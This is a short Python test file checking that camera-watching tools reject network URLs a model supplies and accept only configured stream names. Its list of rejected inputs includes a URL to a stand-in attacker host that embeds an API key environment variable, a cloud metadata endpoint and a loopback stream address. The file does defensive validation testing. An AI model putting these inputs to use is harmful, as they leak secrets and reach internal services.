"""Tools refuse model-supplied network sources and accept configured stream names."""

from __future__ import annotations

import pytest
from sentinel_rig import Rig

BAD = [
    "snapshot:https://attacker.example/x.jpg?k=${OPENROUTER_API_KEY}",
    "http://169.254.169.254/latest/meta-data/",
    "rtsp://127.0.0.1/live",
]


@pytest.mark.parametrize("tool", ["sentinel_look", "sentinel_watch"])
@pytest.mark.parametrize("source", BAD)
def test_tools_refuse_model_supplied_network_urls(rig, tool, source):
    args = {"source": source}
    if tool == "sentinel_watch":
        args["what"] = "tell me when the door opens"
    out = rig.call(tool, **args)
    assert out["ok"] is False and "stream_urls" in out["error"]


def test_a_configured_stream_name_passes_validation(fake_ctx):
    rig = Rig(fake_ctx, config={"stream_urls": {"door": "rtsp://cam.local/live"}})
    out = rig.call("sentinel_look", source="stream:door")
    assert "stream_urls" not in str(out.get("error", ""))
